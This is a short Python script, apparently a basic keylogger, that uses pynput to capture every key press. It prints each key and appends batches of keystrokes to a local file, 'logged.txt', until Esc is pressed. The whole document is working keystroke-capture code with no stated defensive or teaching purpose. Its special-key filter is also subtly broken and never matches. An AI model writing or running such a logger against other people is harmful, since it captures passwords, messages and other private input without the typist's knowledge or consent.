import pynput
from pynput import keyboard as kb
from pynput.keyboard import Key
from pynput.keyboard import Listener

count=0
keys=[]
def on_press(key):
    global keys,count
    keys.append(key)
    count+=1
    print("{0}pressed".format(key))
    if(count>10):
        count=0
        text_file(keys)
        keys=[]


def text_file(keys):
    with open("logged.txt","a") as fp:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:
                fp.write("\n")
            elif k.find("kb.Key")==-1:
                fp.write(k)
            else:
                pass

def on_release(key):
    if key==kb.Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()